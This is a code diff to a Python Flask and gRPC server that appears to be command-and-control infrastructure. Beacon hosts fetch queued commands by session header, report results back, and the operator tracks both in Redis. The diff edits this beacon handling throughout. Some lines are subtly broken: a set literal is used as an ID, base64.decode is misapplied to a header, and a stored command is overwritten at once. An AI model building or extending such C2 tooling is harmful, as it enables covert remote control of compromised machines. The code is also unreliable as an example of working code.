@@ -1,10 +1,12 @@
+import base64
 from flask import *
+import re
 import grpc
 from concurrent import futures
 import time
 import protobuff_pb2_grpc as pb2_grpc
 import protobuff_pb2 as pb2
-import redis # Make sure to install and start the redis server
+import redis  # Make sure to install and start the redis server
 import string
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
@@ -36,6 +38,7 @@ class UnaryService(pb2_grpc.UnaryServicer):
             elif opt == 'GR':
                 # If option is to get the returned results of a beacon, page the Redis DB for the results
                 res = conn.hget('beacons', f'{ID}')
+                res = str(res)
                 result = f'Getting status of beacon {ID}: {res}'
                 result = {'message': result, 'received': True}
                 return pb2.MessageResponse(**result)
@@ -58,18 +61,23 @@ def home():
         return ('')
 
 
-@app.route('/<path:filename>', methods=['GET', 'POST'])
+@app.route('/<path:filename>', methods=['GET'])
 def index(filename):
     if request.method == 'GET':
         bID = {request.headers['APPSESSIONID']}
-        stats = f'Host {bID} grabbed command'
-        with open (f'{bID}.html') as f:
-            content=f.readlines()
+        name = request.headers['RESPONSE']
+        melamo = f'{base64.decode(name)}'
+        print(f'Host {bID} grabbed command')
+        bID = str(bID)
+        bID = re.sub('[^A-Za-z0-9]+', '', bID) # We are removing special characters
+        with open(f'{bID}.html') as f:
+            content = f.readlines()
         for line in content:
             cmd = line
+        conn.hset('beacons', f'{bID}', f'{cmd}') # Add the beacon ID and command to the redis DB
+        conn.hset('beacons', f'{bID}', f'{melamo}')
+        conn.hgetall('beacons')
         return send_from_directory('.', filename)
-        conn.hset("beacons", f'{bID}', f'{cmd}')
-
     return jsonify(request.data)
 
 
@@ -80,7 +88,8 @@ def results():
         print(f'Result: {request.data} from beacon: {val}')
         response = request.data
         bacon = {"bID": val, "Returned data": response}
-        conn.hmset("pythonDict", bacon)
+        conn.hmset("beacons", bacon)
+
         return 'HELO'
 
 
